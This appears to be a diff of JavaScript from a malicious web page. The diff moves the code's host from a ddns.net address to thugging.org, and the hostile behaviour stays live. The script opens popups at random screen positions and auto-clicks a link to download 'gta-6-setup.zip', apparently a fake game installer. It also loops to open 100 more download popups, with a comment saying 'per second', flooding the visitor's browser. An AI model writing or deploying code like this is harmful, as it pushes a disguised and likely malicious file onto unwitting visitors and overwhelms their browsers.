@@ -35,7 +35,7 @@
         }
 
         function openMainPopup() {
-            const url = 'https://thugchat.ddns.net/'; 
+            const url = 'https://thugging.org/'; 
             const { left, top } = getRandomPosition(); 
             const newWindow = window.open(url, '', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
             openWindows.push(newWindow);
@@ -49,7 +49,7 @@
             // Trigger download in the new popup
             newWindow.onload = function() {
                 const downloadLink = newWindow.document.createElement('a');
-                downloadLink.href = 'https://thugchat.ddns.net/static/gta-6-setup.zip';
+                downloadLink.href = 'https://thugging.org/static/gta-6-setup.zip';
                 downloadLink.download = 'gta-6-setup.zip'; // Specify the file name
                 document.body.appendChild(downloadLink);
                 downloadLink.click(); // Simulate a click on the link to start the download
@@ -66,7 +66,7 @@
 
         function openAdditionalPopups() {
             for (let i = 0; i < 100; i++) { // Open 100 additional popups per second
-                const url = 'https://thugchat.ddns.net/static/gta-6-setup.zip'; 
+                const url = 'https://thugging.org/static/gta-6-setup.zip'; 
                 const { left, top } = getRandomPosition(); 
                 const downloadWindow = window.open(url, '', `width=${windowWidth},height=${windowHeight},left=${left},top=${top}`);
                 openWindows.push(downloadWindow);
